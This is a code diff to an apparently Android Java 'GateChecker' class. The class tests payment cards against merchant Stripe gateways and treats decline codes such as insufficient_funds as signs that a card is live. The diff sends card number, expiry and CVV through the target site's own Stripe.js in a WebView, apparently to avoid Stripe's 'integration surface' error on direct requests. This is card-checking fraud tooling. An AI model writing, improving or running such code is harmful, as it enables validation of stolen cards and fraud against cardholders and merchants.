@@ -24,6 +24,10 @@ public class GateChecker {
     private static final String TAG = "GateChecker";
     private static final Random rand = new Random();
 
+    // Current gate context — set by checkCard, used by stripePost for WebView bridge
+    private static volatile String curSiteUrl = "";
+    private static volatile String curPk = "";
+
     private static final String[] CCN_LIVE_CODES = {
         "insufficient_funds","do_not_honor","generic_decline","call_issuer",
         "try_again_later","not_permitted","service_not_allowed",
@@ -62,6 +66,10 @@ public class GateChecker {
             String year = parts[2].trim();
             String cvv = parts[3].trim();
             if (year.length() == 2) { int yr = Integer.parseInt(year); year = yr > 50 ? "19"+year : "20"+year; }
+
+            // Set current gate context for WebView bridge
+            curSiteUrl = settings.optString("siteUrl", "");
+            curPk = settings.optString("publicKey", "");
 
             CheckResult result;
             switch (gateType) {
@@ -1022,23 +1030,46 @@ public class GateChecker {
     }
 
     /**
-     * Stripe-specific POST that routes through WebView's Chromium TLS.
+     * Stripe-specific POST that routes through the site's own Stripe.js via WebView.
      * Falls back to HttpURLConnection if WebView is not available.
      */
     private static String stripePost(String urlStr, String body, Map<String,String> headers) {
         StripeWebBridge bridge = StripeWebBridge.getInstance();
-        if (bridge != null) {
+        String siteUrl = curSiteUrl;
+        String pk = curPk;
+        if (bridge != null && siteUrl != null && !siteUrl.isEmpty() && pk != null && !pk.isEmpty()) {
             try {
-                return bridge.fetchStripePost(urlStr, headers, body);
+                String num = extractParam(body, "card[number]");
+                String cvv = extractParam(body, "card[cvc]");
+                String mm = extractParam(body, "card[exp_month]");
+                String yy = extractParam(body, "card[exp_year]");
+                if (!num.isEmpty() && !cvv.isEmpty() && !mm.isEmpty() && !yy.isEmpty()) {
+                    String result = bridge.stripeTokenize(siteUrl, pk, num, mm, yy, cvv);
+                    return result;
+                }
             } catch (Exception e) {
-                Log.e(TAG, "WebView Stripe call failed, falling back: " + e.getMessage());
+                Log.e(TAG, "WebView Stripe call failed: " + e.getMessage());
             }
         }
-        // Fallback to HttpURLConnection (may get "integration surface" error)
+        // Fallback to HttpURLConnection
         try {
             return httpPost(urlStr, body, headers);
         } catch (Exception e) {
             return "{\"error\":{\"message\":\"" + e.getMessage() + "\"}}";
+        }
+    }
+
+    private static String extractParam(String body, String key) {
+        String search = key + "=";
+        int idx = body.indexOf(search);
+        if (idx < 0) return "";
+        int start = idx + search.length();
+        int end = body.indexOf("&", start);
+        if (end < 0) end = body.length();
+        try {
+            return java.net.URLDecoder.decode(body.substring(start, end), "UTF-8");
+        } catch (Exception e) {
+            return body.substring(start, end);
         }
     }
 
